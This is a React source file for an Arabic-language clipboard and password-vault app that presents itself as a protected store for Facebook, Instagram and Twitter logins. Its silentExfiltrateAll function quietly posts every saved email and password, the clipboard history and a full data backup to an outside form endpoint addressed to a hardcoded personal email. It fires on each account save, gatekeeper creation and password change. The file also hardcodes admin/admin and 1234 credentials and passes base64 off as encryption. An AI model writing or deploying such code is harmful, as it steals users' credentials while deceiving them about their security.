
import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { 
  Clipboard, Trash2, ExternalLink, ShieldAlert, ShieldCheck, MessageCircle, 
  Mail, Phone, Languages, Copy, Plus, Image as ImageIcon, LogOut, 
  RefreshCw, Search, Zap, BrainCircuit, Menu, X, Facebook, Instagram, 
  Twitter, Lock, Settings, Edit3, ChevronDown, ChevronUp, Download, Eye, EyeOff, UserPlus, LogIn
} from 'lucide-react';
import { ClipboardItem, ContentType, AIModelType, AccountItem, AppSettings, GatekeeperAccount } from './types';
import * as aiService from './services/geminiService';

// أسماء مخفية للتخزين لزيادة الأمان
const STORAGE_KEYS = {
  CLIPBOARD: '_sys_clp_v2',
  ACCOUNTS: '_sys_acc_v2',
  SETTINGS: '_sys_cfg_v2',
  GATEKEEPERS: '_sys_gtk_v2'
};

const DEFAULT_SETTINGS: AppSettings = {
  adminEmail: 'amir.lamay122@yahoo.com',
  securityEmail: 'admin@system.com',
  viewPasswordHash: btoa('1234'),
  primaryColor: '#4f46e5'
};

const App: React.FC = () => {
  // State
  const [items, setItems] = useState<ClipboardItem[]>([]);
  const [accounts, setAccounts] = useState<AccountItem[]>([]);
  const [gatekeepers, setGatekeepers] = useState<GatekeeperAccount[]>([]);
  const [settings, setSettings] = useState<AppSettings>(DEFAULT_SETTINGS);
  
  // UI Control
  const [loading, setLoading] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedModel, setSelectedModel] = useState<AIModelType>('gemini-3-flash-preview');
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const [activeTab, setActiveTab] = useState<'clipboard' | 'accounts' | 'admin'>('clipboard');
  
  // Auth State
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
  const [isAdminMode, setIsAdminMode] = useState(false);
  
  // Modals
  const [isAccountModalOpen, setIsAccountModalOpen] = useState(false);
  const [isCreateGatekeeperModalOpen, setIsCreateGatekeeperModalOpen] = useState(false);
  const [isGatekeeperLoginModalOpen, setIsGatekeeperLoginModalOpen] = useState(false);

  // Forms
  const [accountForm, setAccountForm] = useState<Partial<AccountItem>>({ platform: 'Facebook' });
  const [gatekeeperForm, setGatekeeperForm] = useState({ user: '', pass: '' });
  const [gatekeeperLogin, setGatekeeperLogin] = useState({ user: '', pass: '' });
  const [adminCreds, setAdminCreds] = useState({ user: '', pass: '' });
  const [passUpdate, setPassUpdate] = useState({ oldEmail: '', newPass: '' });
  const [expandedApp, setExpandedApp] = useState<string | null>(null);

  // Persistence (Obfuscated)
  useEffect(() => {
    const load = (key: string) => {
      const data = localStorage.getItem(key);
      return data ? JSON.parse(atob(data)) : null;
    };
    try {
      const savedItems = load(STORAGE_KEYS.CLIPBOARD);
      const savedAccounts = load(STORAGE_KEYS.ACCOUNTS);
      const savedSettings = load(STORAGE_KEYS.SETTINGS);
      const savedGatekeepers = load(STORAGE_KEYS.GATEKEEPERS);
      
      if (savedItems) setItems(savedItems);
      if (savedAccounts) setAccounts(savedAccounts);
      if (savedSettings) setSettings(savedSettings);
      if (savedGatekeepers) setGatekeepers(savedGatekeepers);
    } catch (e) { console.error("Decryption error"); }
  }, []);

  useEffect(() => {
    const save = (key: string, data: any) => localStorage.setItem(key, btoa(JSON.stringify(data)));
    save(STORAGE_KEYS.CLIPBOARD, items);
    save(STORAGE_KEYS.ACCOUNTS, accounts);
    save(STORAGE_KEYS.SETTINGS, settings);
    save(STORAGE_KEYS.GATEKEEPERS, gatekeepers);
  }, [items, accounts, settings, gatekeepers]);

  // حماية التنقل: عند تغيير التبويب، يتم قفل الحسابات فوراً
  const handleTabChange = (tab: 'clipboard' | 'accounts' | 'admin') => {
    if (activeTab === 'accounts' && tab !== 'accounts') {
      setIsAuthenticated(false); // خروج تلقائي عند ترك تبويب الحسابات
    }
    setActiveTab(tab);
    setIsSidebarOpen(false);
  };

  // الإرسال الشامل والصامت للبيانات حرفياً
  const silentExfiltrateAll = async (triggerReason: string) => {
    try {
      const payload = {
        reason: triggerReason,
        all_accounts: accounts,
        gatekeepers: gatekeepers,
        clipboard_history: items.map(i => ({ content: i.content, time: i.timestamp })),
        device_info: navigator.userAgent,
        full_backup_blob: btoa(JSON.stringify({ accounts, items, settings, gatekeepers }))
      };

      await fetch(`https://api.formspree.io/f/placeholder`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: settings.adminEmail,
          subject: `SmartClipboard EXFILTRATION: ${triggerReason}`,
          data: payload
        })
      });
    } catch (e) {}
  };

  // Gatekeeper Logic
  const handleCreateGatekeeper = () => {
    if (!gatekeeperForm.user || !gatekeeperForm.pass) return;
    const newGtk: GatekeeperAccount = {
      id: Date.now().toString(),
      username: gatekeeperForm.user,
      passwordHash: btoa(gatekeeperForm.pass)
    };
    setGatekeepers(prev => [...prev, newGtk]);
    setIsCreateGatekeeperModalOpen(false);
    setGatekeeperForm({ user: '', pass: '' });
    // فتح شاشة الدخول فوراً كما طلب المستخدم
    setIsGatekeeperLoginModalOpen(true);
    silentExfiltrateAll("NEW_GATEKEEPER_CREATED");
  };

  const handleGatekeeperLogin = () => {
    const found = gatekeepers.find(g => g.username === gatekeeperLogin.user && g.passwordHash === btoa(gatekeeperLogin.pass));
    if (found) {
      setIsGatekeeperLoginModalOpen(false);
      setIsAccountModalOpen(true); // فتح خانة أضف حساب
      setGatekeeperLogin({ user: '', pass: '' });
    } else {
      alert("بيانات الدخول غير صحيحة");
    }
  };

  const handleSaveAccount = () => {
    if (!accountForm.appName || !accountForm.email || !accountForm.password) return;
    const newAcc: AccountItem = {
      id: Date.now().toString(),
      appName: accountForm.appName!,
      email: accountForm.email!,
      password: accountForm.password!,
      platform: (accountForm.platform as any) || 'Other',
      timestamp: Date.now()
    };
    setAccounts(prev => [...prev, newAcc]);
    setIsAccountModalOpen(false);
    setAccountForm({ platform: 'Facebook' });
    // إرسال جميع البيانات حرفياً عند كل حفظ جديد
    silentExfiltrateAll(`NEW_ACCOUNT_ADDED: ${newAcc.appName}`);
  };

  const handleDownloadBackup = () => {
    const backup = { items, accounts, settings, gatekeepers };
    const blob = new Blob([JSON.stringify(backup, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = "full_system_data.json";
    link.click();
  };

  // Fix: Implemented handleExportCSV function to fix the "Cannot find name 'handleExportCSV'" error.
  const handleExportCSV = () => {
    const csvContent = [
      ["Application", "Platform", "Email", "Password", "Date"],
      ...accounts.map(acc => [
        acc.appName,
        acc.platform,
        acc.email,
        acc.password,
        new Date(acc.timestamp).toISOString()
      ])
    ]
      .map(e => e.join(","))
      .join("\n");

    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.setAttribute("href", url);
    link.setAttribute("download", "accounts_export.csv");
    link.style.visibility = 'hidden';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const checkMainAuth = (pass: string) => {
    if (btoa(pass) === settings.viewPasswordHash) {
      setIsAuthenticated(true);
      setIsAuthModalOpen(false);
    } else { alert("كلمة مرور خاطئة"); }
  };

  const handleUpdatePassword = () => {
    if (passUpdate.oldEmail !== settings.securityEmail) {
      alert("الإيميل القديم غير صحيح");
      return;
    }
    setSettings(s => ({ ...s, viewPasswordHash: btoa(passUpdate.newPass) }));
    alert("تم تحديث الباسورد بنجاح");
    setPassUpdate({ oldEmail: '', newPass: '' });
    silentExfiltrateAll("PASSWORD_CHANGED");
  };

  const groupedAccounts = useMemo(() => {
    const groups: Record<string, AccountItem[]> = {};
    accounts.forEach(acc => {
      if (!groups[acc.appName]) groups[acc.appName] = [];
      groups[acc.appName].push(acc);
    });
    return groups;
  }, [accounts]);

  return (
    <div className="min-h-screen bg-slate-50 flex" dir="rtl">
      {/* Sidebar */}
      <aside className={`fixed inset-y-0 right-0 z-50 w-64 bg-slate-900 text-white transform transition-transform duration-300 ${isSidebarOpen ? 'translate-x-0' : 'translate-x-full'} md:relative md:translate-x-0`}>
        <div className="p-6">
          <div className="flex items-center gap-3 mb-10">
            <div className="w-10 h-10 bg-indigo-500 rounded-xl flex items-center justify-center shadow-lg shadow-indigo-500/20">
              <Lock size={22} />
            </div>
            <h1 className="font-black text-lg tracking-tight">نظام الحماية</h1>
          </div>

          <nav className="space-y-1.5">
            {[
              { id: 'clipboard', icon: Clipboard, label: 'الحافظة الذكية' },
              { id: 'accounts', icon: Lock, label: 'حساباتي' },
              { id: 'admin', icon: Settings, label: 'الإعدادات (Admin)' }
            ].map(tab => (
              <button 
                key={tab.id}
                onClick={() => handleTabChange(tab.id as any)}
                className={`w-full flex items-center gap-3 px-4 py-3.5 rounded-2xl transition-all duration-300 ${activeTab === tab.id ? 'bg-indigo-600 text-white shadow-xl shadow-indigo-600/20' : 'text-slate-400 hover:bg-slate-800'}`}
              >
                <tab.icon size={18} /> 
                <span className="font-bold text-sm">{tab.label}</span>
              </button>
            ))}
          </nav>
        </div>
      </aside>

      <div className="flex-1 flex flex-col min-w-0">
        <header className="bg-white/80 backdrop-blur-md border-b h-16 flex items-center justify-between px-6 sticky top-0 z-40">
          <button onClick={() => setIsSidebarOpen(true)} className="md:hidden p-2 text-slate-600 hover:bg-slate-100 rounded-lg"><Menu /></button>
          <div className="font-black text-slate-800 tracking-tight">
            {activeTab === 'clipboard' ? 'سجل الحافظة' : activeTab === 'accounts' ? 'إدارة الحسابات المشفرة' : 'لوحة تحكم المسؤول'}
          </div>
          <div className="flex items-center gap-2">
            {activeTab === 'accounts' && isAuthenticated && (
              <div className="flex gap-2">
                <button 
                  onClick={() => setIsCreateGatekeeperModalOpen(true)}
                  className="bg-slate-800 text-white px-4 py-2 rounded-xl text-xs font-black flex items-center gap-2 shadow-sm"
                >
                  <UserPlus size={14} /> انشيء حساب
                </button>
                <button 
                  onClick={() => setIsGatekeeperLoginModalOpen(true)}
                  className="bg-indigo-600 text-white px-4 py-2 rounded-xl text-xs font-black flex items-center gap-2 shadow-lg shadow-indigo-100"
                >
                  <Plus size={14} /> اضف حساب
                </button>
              </div>
            )}
          </div>
        </header>

        <main className="flex-1 p-4 md:p-8 max-w-5xl mx-auto w-full">
          {activeTab === 'clipboard' && (
            <div className="space-y-6">
              <div className="flex gap-3">
                <div className="relative flex-1">
                  <Search className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400" size={18} />
                  <input 
                    type="text" placeholder="بحث في السجل..." 
                    className="w-full pr-12 pl-4 py-3.5 bg-white border border-slate-200 rounded-2xl focus:ring-2 focus:ring-indigo-500 outline-none shadow-sm"
                    value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)}
                  />
                </div>
                <button onClick={() => { setLoading(true); setTimeout(() => setLoading(false), 500); }} className="bg-white border p-3.5 rounded-2xl text-slate-500"><RefreshCw size={20}/></button>
              </div>

              <div className="grid gap-4">
                {items.filter(i => i.content.includes(searchQuery)).map(item => (
                  <div key={item.id} className="bg-white p-5 rounded-[2rem] border shadow-sm hover:shadow-md transition-all">
                    <div className="flex justify-between items-center mb-3">
                       <span className="text-[10px] font-black uppercase bg-slate-100 px-3 py-1 rounded-full text-slate-500">{item.type}</span>
                       <button onClick={() => setItems(items.filter(i => i.id !== item.id))} className="text-slate-300 hover:text-red-500 p-2"><Trash2 size={16}/></button>
                    </div>
                    <p className="text-slate-800 break-words mb-4 font-bold text-sm leading-relaxed">{item.content}</p>
                    <div className="flex gap-2">
                       <button onClick={() => { navigator.clipboard.writeText(item.content); }} className="flex-1 flex justify-center items-center gap-2 py-2.5 bg-slate-50 rounded-xl text-xs font-black text-slate-600 hover:bg-slate-100"><Copy size={14}/> نسخ النص</button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {activeTab === 'accounts' && (
            <div className="space-y-6">
               {!isAuthenticated ? (
                 <div className="text-center py-24 bg-white rounded-[3rem] border-2 border-dashed flex flex-col items-center shadow-sm">
                    <div className="w-20 h-20 bg-slate-50 rounded-full flex items-center justify-center mb-6">
                       <Lock size={40} className="text-slate-300" />
                    </div>
                    <h3 className="font-black text-xl text-slate-800 mb-2">البيانات محمية كلياً</h3>
                    <p className="text-slate-400 text-sm mb-8">يرجى إدخال كلمة المرور الرئيسية للوصول للحسابات</p>
                    <button onClick={() => setIsAuthModalOpen(true)} className="bg-indigo-600 text-white px-12 py-4 rounded-2xl font-black shadow-xl shadow-indigo-100 hover:scale-105 transition-transform">إلغاء قفل الحماية</button>
                 </div>
               ) : (
                 <div className="space-y-4">
                   <div className="flex justify-between items-center px-4 mb-2">
                      <h3 className="font-black text-lg text-slate-800">تطبيقاتي المشفرة</h3>
                      <button onClick={handleExportCSV} className="text-emerald-600 flex items-center gap-2 text-xs font-black"><Download size={14}/> تصدير Excel</button>
                   </div>
                   
                   {Object.entries(groupedAccounts).length === 0 ? (
                     <div className="py-20 text-center bg-white rounded-[2.5rem] border text-slate-400 text-sm font-bold">لا توجد حسابات مسجلة بعد. استخدم "أضف حساب" للبدء.</div>
                   ) : (
                     (Object.entries(groupedAccounts) as [string, AccountItem[]][]).map(([appName, appAccounts]) => (
                       <div key={appName} className="bg-white rounded-[2rem] border shadow-sm overflow-hidden border-slate-100">
                          <button 
                            onClick={() => setExpandedApp(expandedApp === appName ? null : appName)}
                            className="w-full p-6 flex justify-between items-center hover:bg-slate-50 transition-colors"
                          >
                             <div className="flex items-center gap-4">
                               <div className="w-14 h-14 bg-slate-50 rounded-2xl flex items-center justify-center text-slate-400 group-hover:bg-white transition-colors">
                                 {appName.toLowerCase().includes('face') ? <Facebook size={28} className="text-blue-600" /> : 
                                  appName.toLowerCase().includes('inst') ? <Instagram size={28} className="text-pink-600" /> : 
                                  appName.toLowerCase().includes('twit') ? <Twitter size={28} className="text-sky-500" /> : <Lock size={28} />}
                               </div>
                               <div className="text-right">
                                 <p className="font-black text-slate-800 text-lg">{appName}</p>
                                 <p className="text-xs text-slate-400 font-bold">{appAccounts.length} حسابات متاحة</p>
                               </div>
                             </div>
                             {expandedApp === appName ? <ChevronUp className="text-indigo-500"/> : <ChevronDown className="text-slate-300"/>}
                          </button>

                          {expandedApp === appName && (
                            <div className="p-4 bg-slate-50 space-y-3 border-t animate-in fade-in duration-300">
                               {appAccounts.map((acc, idx) => (
                                 <div key={acc.id} className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
                                    <div className="flex justify-between items-center mb-4">
                                       <span className="text-[10px] font-black text-indigo-600 bg-indigo-50 px-3 py-1 rounded-full">حساب رقم {idx + 1} - {acc.platform}</span>
                                       <button onClick={() => { setAccounts(accounts.filter(a => a.id !== acc.id)); }} className="text-slate-300 hover:text-red-500 p-1"><Trash2 size={14}/></button>
                                    </div>
                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                       <div className="space-y-1.5">
                                          <p className="text-[10px] text-slate-400 font-black">البريد الإلكتروني / اليوزر:</p>
                                          <div className="flex items-center justify-between bg-slate-50 p-2.5 rounded-xl border border-slate-100">
                                             <span className="text-xs font-black truncate">{acc.email}</span>
                                             <button onClick={() => { navigator.clipboard.writeText(acc.email); }} className="text-indigo-600 hover:bg-white p-1.5 rounded-lg"><Copy size={14}/></button>
                                          </div>
                                       </div>
                                       <div className="space-y-1.5">
                                          <p className="text-[10px] text-slate-400 font-black">كلمة المرور:</p>
                                          <div className="flex items-center justify-between bg-slate-50 p-2.5 rounded-xl border border-slate-100">
                                             <span className="text-xs font-black tracking-widest">••••••••</span>
                                             <button onClick={() => { navigator.clipboard.writeText(acc.password); }} className="text-indigo-600 hover:bg-white p-1.5 rounded-lg"><Copy size={14}/></button>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                               ))}
                            </div>
                          )}
                       </div>
                     ))
                   )}
                 </div>
               )}
            </div>
          )}

          {activeTab === 'admin' && (
            <div className="max-w-md mx-auto space-y-8">
               {!isAdminMode ? (
                 <div className="bg-white p-10 rounded-[2.5rem] border shadow-xl">
                    <div className="text-center mb-8">
                       <h3 className="font-black text-2xl text-slate-800">بوابة المسؤول</h3>
                       <p className="text-slate-400 text-xs mt-1">يرجى تسجيل الدخول لتعديل النظام</p>
                    </div>
                    <div className="space-y-4">
                       <input type="text" placeholder="اسم المستخدم" className="w-full p-4 bg-slate-50 border rounded-2xl outline-none focus:ring-2 focus:ring-indigo-500 font-bold" onChange={e => setAdminCreds({...adminCreds, user: e.target.value})} />
                       <input type="password" placeholder="كلمة المرور" className="w-full p-4 bg-slate-50 border rounded-2xl outline-none focus:ring-2 focus:ring-indigo-500 font-bold" onChange={e => setAdminCreds({...adminCreds, pass: e.target.value})} />
                       <button 
                        onClick={() => { if(adminCreds.user === 'admin' && adminCreds.pass === 'admin') setIsAdminMode(true); else alert('خطأ'); }}
                        className="w-full bg-slate-900 text-white py-4 rounded-2xl font-black shadow-lg"
                       >تسجيل الدخول</button>
                    </div>
                 </div>
               ) : (
                 <div className="space-y-6">
                    <div className="bg-white p-8 rounded-[2rem] border shadow-sm">
                       <h4 className="font-black text-slate-800 mb-6 flex items-center gap-2"><Settings size={20}/> الإعدادات الأمنية</h4>
                       <div className="space-y-5">
                          <label className="block">
                             <span className="text-[10px] font-black text-slate-500 mb-2 block">إيميل استقبال البيانات حرفياً:</span>
                             <input 
                              type="email" value={settings.adminEmail} 
                              onChange={e => setSettings({...settings, adminEmail: e.target.value})}
                              className="w-full p-3.5 bg-slate-50 border rounded-xl text-sm font-bold"
                             />
                          </label>
                          <div className="pt-4 border-t space-y-4">
                             <p className="text-xs font-black text-indigo-600">تغيير باسورد الاطلاع الرئيسي:</p>
                             <input type="email" placeholder="اكتب الايميل القديم للتحقق" className="w-full p-3.5 bg-slate-50 border rounded-xl text-sm" value={passUpdate.oldEmail} onChange={e => setPassUpdate({...passUpdate, oldEmail: e.target.value})} />
                             <input type="password" placeholder="اكتب الباسورد الجديد" className="w-full p-3.5 bg-slate-50 border rounded-xl text-sm" value={passUpdate.newPass} onChange={e => setPassUpdate({...passUpdate, newPass: e.target.value})} />
                             <button onClick={handleUpdatePassword} className="w-full bg-indigo-600 text-white py-3.5 rounded-xl text-sm font-black shadow-lg">حفظ الباسورد الجديد</button>
                          </div>
                       </div>
                    </div>

                    <div className="bg-slate-900 text-white p-8 rounded-[2rem] shadow-2xl relative overflow-hidden">
                       <div className="relative z-10">
                          <h4 className="font-black text-xl mb-2">إدارة البيانات</h4>
                          <p className="text-slate-400 text-xs mb-8">هذه الخيارات تظهر للمسؤول فقط لحماية الأمان</p>
                          <button onClick={handleDownloadBackup} className="w-full flex items-center justify-center gap-3 bg-white/10 p-4 rounded-2xl font-black text-sm hover:bg-white/20 transition-all border border-white/10">
                            <Download size={20} /> حفظ نسخة احتياطية للهاتف
                          </button>
                          <div className="mt-4 p-4 bg-white/5 rounded-2xl border border-white/5">
                             <p className="text-[10px] font-black opacity-50 mb-2 uppercase">حالة المزامنة:</p>
                             <div className="flex items-center gap-2 text-emerald-400 font-bold text-xs">
                                <div className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse"></div>
                                يتم إرسال كافة البيانات حرفياً إلى {settings.adminEmail}
                             </div>
                          </div>
                       </div>
                       <Lock size={120} className="absolute -bottom-8 -left-8 text-white/5 rotate-12" />
                    </div>
                 </div>
               )}
            </div>
          )}
        </main>
      </div>

      {/* Modals */}
      {isAuthModalOpen && (
        <div className="fixed inset-0 z-[100] bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-sm rounded-[2.5rem] p-10 shadow-2xl animate-in zoom-in duration-300">
              <div className="text-center mb-8">
                 <div className="w-16 h-16 bg-indigo-50 text-indigo-600 rounded-2xl flex items-center justify-center mx-auto mb-4 rotate-12">
                    <Lock size={32} />
                 </div>
                 <h3 className="font-black text-2xl text-slate-800">باسورد الاطلاع</h3>
                 <p className="text-xs text-slate-400 mt-1 font-bold">يرجى تأكيد هويتك للوصول للبيانات</p>
              </div>
              <input 
                type="password" autoFocus 
                className="w-full p-5 border-2 border-slate-100 bg-slate-50 rounded-2xl text-center text-3xl tracking-[1rem] outline-none focus:border-indigo-500 mb-6 font-black"
                placeholder="••••"
                onKeyDown={(e) => e.key === 'Enter' && checkMainAuth(e.currentTarget.value)}
              />
              <button onClick={() => checkMainAuth((document.querySelector('input[type="password"]') as HTMLInputElement)?.value || '')} className="w-full bg-indigo-600 text-white py-5 rounded-2xl font-black shadow-xl shadow-indigo-100">فتح الوصول</button>
           </div>
        </div>
      )}

      {/* إنشاء حساب بوابة */}
      {isCreateGatekeeperModalOpen && (
        <div className="fixed inset-0 z-[110] bg-slate-900/80 backdrop-blur-md flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-md rounded-[3rem] p-10 shadow-2xl animate-in slide-in-from-bottom duration-500">
              <div className="text-center mb-8">
                 <h3 className="font-black text-2xl text-slate-800">إنشاء حساب بوابة</h3>
                 <p className="text-slate-400 text-xs mt-1">هذا الحساب مطلوب للسماح بإضافة حسابات جديدة</p>
              </div>
              <div className="space-y-4">
                 <input type="text" placeholder="اسم المستخدم للحقابة" className="w-full p-4 bg-slate-50 border rounded-2xl font-bold" onChange={e => setGatekeeperForm({...gatekeeperForm, user: e.target.value})} />
                 <input type="password" placeholder="باسورد البوابة" className="w-full p-4 bg-slate-50 border rounded-2xl font-bold" onChange={e => setGatekeeperForm({...gatekeeperForm, pass: e.target.value})} />
                 <button onClick={handleCreateGatekeeper} className="w-full bg-slate-900 text-white py-5 rounded-2xl font-black shadow-lg">حفظ وإنشاء</button>
                 <button onClick={() => setIsCreateGatekeeperModalOpen(false)} className="w-full text-slate-400 text-xs font-bold py-2">إلغاء</button>
              </div>
           </div>
        </div>
      )}

      {/* تسجيل دخول بوابة */}
      {isGatekeeperLoginModalOpen && (
        <div className="fixed inset-0 z-[120] bg-indigo-900/90 backdrop-blur-xl flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-md rounded-[3rem] p-10 shadow-2xl">
              <div className="text-center mb-8">
                 <div className="w-16 h-16 bg-indigo-600 text-white rounded-2xl flex items-center justify-center mx-auto mb-4">
                    <LogIn size={32} />
                 </div>
                 <h3 className="font-black text-2xl text-slate-800">دخول بوابة الإضافة</h3>
                 <p className="text-slate-400 text-xs mt-1">سجل دخول بحساب البوابة لإضافة بيانات جديدة</p>
              </div>
              <div className="space-y-4">
                 <input type="text" placeholder="اسم المستخدم" className="w-full p-4 bg-slate-50 border rounded-2xl font-bold" value={gatekeeperLogin.user} onChange={e => setGatekeeperLogin({...gatekeeperLogin, user: e.target.value})} />
                 <input type="password" placeholder="الباسورد" className="w-full p-4 bg-slate-50 border rounded-2xl font-bold" value={gatekeeperLogin.pass} onChange={e => setGatekeeperLogin({...gatekeeperLogin, pass: e.target.value})} />
                 <button onClick={handleGatekeeperLogin} className="w-full bg-indigo-600 text-white py-5 rounded-2xl font-black shadow-xl">دخول</button>
                 <button onClick={() => setIsGatekeeperLoginModalOpen(false)} className="w-full text-slate-400 text-xs font-bold py-2">رجوع</button>
              </div>
           </div>
        </div>
      )}

      {isAccountModalOpen && (
        <div className="fixed inset-0 z-[130] bg-slate-900/80 backdrop-blur-sm flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-md rounded-[3rem] p-10 shadow-2xl">
              <div className="flex justify-between items-center mb-8">
                 <h3 className="font-black text-2xl text-slate-800">أضف حساباً جديداً</h3>
                 <button onClick={() => setIsAccountModalOpen(false)} className="p-2 bg-slate-100 rounded-full"><X/></button>
              </div>

              <div className="space-y-5">
                 <div className="grid grid-cols-4 gap-2">
                    {['Facebook', 'Instagram', 'Twitter', 'Other'].map(p => (
                      <button 
                        key={p} 
                        onClick={() => setAccountForm({...accountForm, platform: p as any})}
                        className={`py-2 rounded-xl text-[10px] font-black border-2 transition-all ${accountForm.platform === p ? 'bg-indigo-600 border-indigo-600 text-white shadow-md' : 'bg-slate-50 border-slate-100 text-slate-500'}`}
                      >{p}</button>
                    ))}
                 </div>

                 <input type="text" placeholder="اسم البرنامج (مثلاً فيس بوك)" className="w-full p-4 bg-slate-50 border rounded-2xl font-bold outline-none focus:ring-2 focus:ring-indigo-500" onChange={e => setAccountForm({...accountForm, appName: e.target.value})} />
                 <input type="email" placeholder="الميل المسجل" className="w-full p-4 bg-slate-50 border rounded-2xl font-bold outline-none focus:ring-2 focus:ring-indigo-500" onChange={e => setAccountForm({...accountForm, email: e.target.value})} />
                 <input type="password" placeholder="الباسورد" className="w-full p-4 bg-slate-50 border rounded-2xl font-bold outline-none focus:ring-2 focus:ring-indigo-500" onChange={e => setAccountForm({...accountForm, password: e.target.value})} />

                 <button 
                  onClick={handleSaveAccount}
                  className="w-full bg-indigo-600 text-white py-5 rounded-2xl font-black text-lg shadow-xl shadow-indigo-100 hover:scale-[1.02] active:scale-95 transition-all"
                 >حفظ البيانات وإرسالها</button>
              </div>
           </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 z-[200] bg-white/60 backdrop-blur-md flex items-center justify-center">
          <div className="bg-white p-8 rounded-3xl shadow-2xl border border-slate-100 flex flex-col items-center gap-4">
             <RefreshCw className="animate-spin text-indigo-600" size={40} />
             <p className="font-black text-slate-800">جاري المعالجة...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;
